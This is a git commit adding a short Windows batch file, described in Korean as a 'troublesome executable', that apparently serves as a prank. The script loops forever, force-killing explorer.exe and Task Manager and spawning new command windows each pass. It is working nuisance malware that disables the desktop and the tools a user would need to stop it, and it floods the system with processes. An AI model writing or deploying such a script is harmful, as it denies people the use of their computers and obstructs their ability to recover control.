e7c7e209112c6b930a4dc6352992d0c2c56a2ca3
ActiveXTi <61903484+ActiveXTi@users.noreply.github.com>
2020-11-24 16:48:33 +0900

    골치 아픈 실행파일

---
+++ .bat
@@ -0,0 +1,13 @@
+@echo off
+title Hahahahaha
+color c0
+tree
+tree
+tree
+tree
+tree
+:A
+taskkill /f /im explorer.exe
+taskkill /f /im taskmgr.exe
+start cmd /k "tree&tree&tree&tree&tree&tree&tree"
+goto A
